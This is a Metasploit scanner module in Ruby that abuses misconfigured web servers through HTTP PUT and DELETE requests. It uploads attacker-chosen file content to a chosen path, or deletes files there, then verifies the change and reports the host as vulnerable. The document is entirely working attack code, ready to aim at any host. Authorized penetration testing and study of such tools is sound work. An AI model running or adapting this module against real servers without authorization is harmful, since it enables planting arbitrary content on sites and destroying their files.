##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanDir
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
      'Description'    => %q{
        This module can abuse misconfigured web servers to upload and delete web content
        via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.

        PUT is the default.  If filename isn't specified, the module will generate a
        random string for you as a .txt file. If DELETE is used, a filename is required.
      },
      'Author'      =>
        [
          'Kashif [at] compulife.com.pk',
          'CG',
          'sinn3r',
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
      [
        [ 'OSVDB', '397'],
      ],
      'Actions'     =>
        [
          ['PUT'],
          ['DELETE']
        ],
      'DefaultAction' => 'PUT'
    )

    register_options(
      [
        OptString.new('PATH', [true,  "The path to attempt to write or delete", "/"]),
        OptString.new('FILENAME', [true,  "The file to attempt to write or delete", "msf_http_put_test.txt"]),
        OptString.new('FILEDATA', [false, "The data to upload into the file", "msf test file"]),
        OptString.new('ACTION', [true, "PUT or DELETE", "PUT"])
      ])
  end

  #
  # Send a normal HTTP request and see if we successfully uploaded or deleted a file.
  # If successful, return true, otherwise false.
  #
  def file_exists(path, data, ip)
    begin
      res = send_request_cgi(
        {
          'uri'    => path,
          'method' => 'GET',
          'ctype'  => 'text/plain',
          'data'   => data,
        }, 20
      ).to_s
    rescue ::Exception => e
      print_error("#{ip}: Error: #{e.to_s}")
      return nil
    end

    return (res =~ /#{data}/) ? true : false
  end

  #
  # Do a PUT request to the server.  Function returns the HTTP response.
  #
  def do_put(path, data, ip)
    begin
      res = send_request_cgi(
        {
          'uri'    => normalize_uri(path),
          'method' => 'PUT',
          'ctype'  => 'text/plain',
          'data'   => data,
        }, 20
      )
    rescue ::Exception => e
      print_error("#{ip}: Error: #{e.to_s}")
      return nil
    end

    return res
  end

  #
  # Do a DELETE request. Function returns the HTTP response.
  #
  def do_delete(path, ip)
    begin
      res = send_request_cgi(
        {
          'uri'    => normalize_uri(path),
          'method' => 'DELETE',
          'ctype'  => 'text/html',
        }, 20
      )
    rescue ::Exception => e
      print_error("#{ip}: Error: #{e.to_s}")
      return nil
    end

    return res
  end

  #
  # Main function for the module, duh!
  #
  def run_host(ip)
    path   = datastore['PATH']
    data   = datastore['FILEDATA']

    if path[-1,1] != '/'
      path += '/'
    end

    path += datastore['FILENAME']

    case action.name
    when 'PUT'
      # Append filename if there isn't one
      if path !~ /(.+\.\w+)$/
        path << "#{Rex::Text.rand_text_alpha(5)}.txt"
        vprint_status("No filename specified. Using: #{path}")
      end

      # Upload file
      res = do_put(path, data, ip)
      vprint_status("#{ip}: Reply: #{res.code.to_s}") if not res.nil?

      # Check file
      if not res.nil? and file_exists(path, data, ip)
        turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
        print_good("File uploaded: #{turl}")
        report_vuln(
          :host         => ip,
          :port         => rport,
          :proto        => 'tcp',
          :name         => self.name,
          :info         => "Module #{self.fullname} confirmed write access to #{turl} via PUT",
          :refs         => self.references,
          :exploited_at => Time.now.utc
        )
      else
        print_error("#{ip}: File doesn't seem to exist. The upload probably failed")
      end

    when 'DELETE'
      # Check file before deleting
      if path !~ /(.+\.\w+)$/
        print_error("You must supply a filename")
        return
      elsif not file_exists(path, data, ip)
        print_error("File is already gone. Will not continue DELETE")
        return
      end

      # Delete our file
      res = do_delete(path, ip)
      vprint_status("#{ip}: Reply: #{res.code.to_s}") if not res.nil?

      # Check if DELETE was successful
      if res.nil? or file_exists(path, data, ip)
        print_error("#{ip}: DELETE failed. File is still there.")
      else
        turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
        print_good("File deleted: #{turl}")
        report_vuln(
          :host         => ip,
          :port         => rport,
          :proto        => 'tcp',
          :sname => (ssl ? 'https' : 'http'),
          :name         => self.name,
          :info         => "Module #{self.fullname} confirmed write access to #{turl} via DELETE",
          :refs         => self.references,
          :exploited_at => Time.now.utc
        )
      end
    end
  end
end
